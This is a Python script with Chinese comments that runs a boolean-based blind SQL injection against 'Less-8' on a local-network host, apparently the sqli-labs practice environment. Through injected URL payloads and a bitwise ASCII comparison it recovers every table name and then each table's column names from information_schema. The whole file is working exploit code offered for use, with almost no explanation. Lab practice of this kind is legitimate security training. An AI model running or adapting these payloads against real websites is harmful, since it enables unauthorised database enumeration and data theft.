import string
import requests
import time

t0 = time.time()
url = "http://192.168.43.117:9002/Less-8/"
reslen = len(requests.get(url = url + "?id=1").text)
print("正常情况下网页返回数据的长度：" + str(reslen))

# 获取数据库的字段
table_name = ""
table_num = 0
table_list= []
ascii_list = [1,2,4,8,16,32,64,128]
# range范围为表的个数
for i in range(0,10):
	table_len = 0
	while True:
		table_url = url + "?id=1'+and+(select+length(table_name)+from+information_schema.tables+where+table_schema=database()+limit+"+str(i)+",1)=" + str(table_len) + " -- xn"
		#print(table_url)
		if len(requests.get(table_url).text) == reslen:
			# print("第"+str(i)+"个"+"数据库表的长度为："+str(table_len))
			for a in range(1,table_len+1):
				for c in ascii_list:
					table_url = url + "?id=1'+and+(select+ascii(mid((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+"+str(i)+",1),"+str(a)+",1)))%26"+str(c)+" -- xn"
					# print(table_url)
					if len(requests.get(table_url).text) == reslen:
						table_num += c
						# print(table_num)
				table_name += chr(table_num)
				table_num = 0
			table_list.append(table_name.strip())
			table_name = ""
			# print(table_list)
			break
		if table_len == 20:
			# print("出现错误")
			break
		table_len += 1

print("******************数据库的表为*********************")
print(table_list)
print("\n")


# 获取数据库的字段
for number in range(0,len(table_list)):
	column_name = ""
	column_list= []
	column_num = 0
	# range范围为字段的个数
	for i in range(0,10):
		column_len = 0
		while True:
			column_url = url + "?id=1'+and+(select+length(column_name)+from+information_schema.columns+where+table_name="+"'"+table_list[number]+"'"+"+limit+"+str(i)+",1)=" + str(column_len) + " -- xn"
	 		# print(table_url)
			if len(requests.get(column_url).text) == reslen:
				# print("第"+str(i)+"个"+"字段的长度为："+str(column_len))
				for a in range(1,column_len+1):
					for c in ascii_list:
						column_url = url + "?id=1'+and+(select+ascii(mid((select+column_name+from+information_schema.columns+where+table_name="+"'"+table_list[number]+"'"+"+limit+"+str(i)+",1),"+str(a)+",1)))%26"+str(c)+" -- xn"
						# print(column_url)
						if len(requests.get(column_url).text) == reslen:
							column_num += c
							# print(column_num)
					column_name += chr(column_num)
					# print(column_name)
					column_num = 0
				column_list.append(column_name.strip())
				column_name = ""
				# print(column_list)
				break
			if column_len == 20:
				# print("出现错误")
				break
			column_len += 1
	print("******************表的字段为*********************")
	print(column_list)

t1 = time.time()

print("Spent Time:%s" % (t1-t0))